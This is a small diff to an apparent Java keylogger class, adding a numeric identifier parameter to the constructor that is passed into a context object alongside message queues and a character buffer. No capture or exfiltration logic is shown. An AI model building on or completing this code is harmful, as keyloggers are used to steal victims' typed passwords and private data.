@@ -13,11 +13,12 @@ public class Keylogger implements Runnable {
     private boolean flag = true;
     private CommandExecutor executor;
 
-    public Keylogger(BlockingQueue<String> queueout, BlockingQueue<String> queuein) {
+    public Keylogger(BlockingQueue<String> queueout, BlockingQueue<String> queuein, int mynumber) {
         ArrayList<Object>  array = new ArrayList<>();
         array.add(queueout);
         buf = CharBuffer.allocate(240);
         array.add(buf);
+        array.add(mynumber);
         context = new Context( array);
 
 
